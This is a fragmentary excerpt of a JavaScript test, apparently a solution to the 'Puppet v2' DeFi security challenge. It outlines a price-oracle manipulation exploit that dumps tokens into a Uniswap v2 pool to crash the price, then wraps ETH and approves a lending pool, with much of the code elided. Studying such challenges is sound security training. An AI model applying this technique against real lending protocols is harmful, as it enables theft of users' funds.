...
describe("[Challenge] Puppet v2", function () {
  ...
  it("Exploit", async function () {
    ...
    // Swapping 10k tokens for eth, this txn will crash the price of the token in the uniswap v2 pool
    ...
    // Swapping ETH for WETH
    await this.weth.connect(attacker).deposit({ value: WETHDepositAmount });

    await this.weth
      .connect(attacker)
      .approve(this.lendingPool.address, WETHDepositAmount);
